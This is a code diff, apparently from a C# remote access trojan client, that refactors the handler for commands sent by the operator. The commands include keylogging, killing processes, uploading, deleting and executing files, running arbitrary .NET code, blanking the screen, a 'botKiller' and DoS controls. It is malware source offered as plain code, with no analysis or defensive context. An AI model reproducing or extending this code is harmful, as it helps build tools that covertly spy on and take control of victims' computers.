@@ -17,6 +17,7 @@ namespace Client.Handle_Packet
         public static CancellationTokenSource ctsDos;
         public static CancellationTokenSource ctsReportWindow;
         public static FormChat GetFormChat;
+        public static string FileCopy = null;
 
         public static void Read(object data)
         {
@@ -37,7 +38,6 @@ namespace Client.Handle_Packet
                             Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                             break;
                         }
-
 
                     case "thumbnails":
                         {
@@ -113,79 +113,15 @@ namespace Client.Handle_Packet
 
                     case "processManager":
                         {
-                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
-                            {
-                                case "List":
-                                    {
-                                        new HandleProcessManager().ProcessList();
-                                        break;
-                                    }
-
-                                case "Kill":
-                                    {
-                                        new HandleProcessManager().ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
-                                        break;
-                                    }
-                            }
+                            new HandleProcessManager(unpack_msgpack);
                         }
                         break;
 
                     case "fileManager":
                         {
-                            switch (unpack_msgpack.ForcePathObject("Command").AsString)
-                            {
-                                case "getDrivers":
-                                    {
-                                        new FileManager().GetDrivers();
-                                        break;
-                                    }
-
-                                case "getPath":
-                                    {
-                                        new FileManager().GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
-                                        break;
-                                    }
-
-                                case "uploadFile":
-                                    {
-                                        string fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
-                                        if (File.Exists(fullPath))
-                                        {
-                                            File.Delete(fullPath);
-                                            Thread.Sleep(500);
-                                        }
-                                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
-                                        break;
-                                    }
-
-                                case "reqUploadFile":
-                                    {
-                                        new FileManager().ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString); ;
-                                        break;
-                                    }
-
-                                case "deleteFile":
-                                    {
-                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                                        File.Delete(fullPath);
-                                        break;
-                                    }
-
-                                case "execute":
-                                    {
-                                        string fullPath = unpack_msgpack.ForcePathObject("File").AsString;
-                                        Process.Start(fullPath);
-                                        break;
-                                    }
-                            }
+                            new FileManager(unpack_msgpack);
                         }
                         break;
-
-                    case "socketDownload":
-                        {
-                            new FileManager().DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString, unpack_msgpack.ForcePathObject("DWID").AsString);
-                            break;
-                        }
 
                     case "botKiller":
                         {
@@ -195,7 +131,6 @@ namespace Client.Handle_Packet
 
                     case "keyLogger":
                         {
-                            FileManager fileManager = new FileManager();
                             string isON = unpack_msgpack.ForcePathObject("isON").AsString;
                             if (isON == "true")
                             {
@@ -297,18 +232,18 @@ namespace Client.Handle_Packet
                             new HandlerExecuteDotNetCode(unpack_msgpack);
                             break;
                         }
-                        
+
                     case "blankscreen":
                         {
                             HandleBlankScreen.RunBlankScreen();
                             break;
                         }
-                        
-                    case "netStat":
-                        {
-                            HandleNetStat.RunNetStat();
-                            break;
-                        }
+
+                        //case "netStat":
+                        //    {
+                        //        HandleNetStat.RunNetStat();
+                        //        break;
+                        //    }
                 }
             }
             catch (Exception ex)
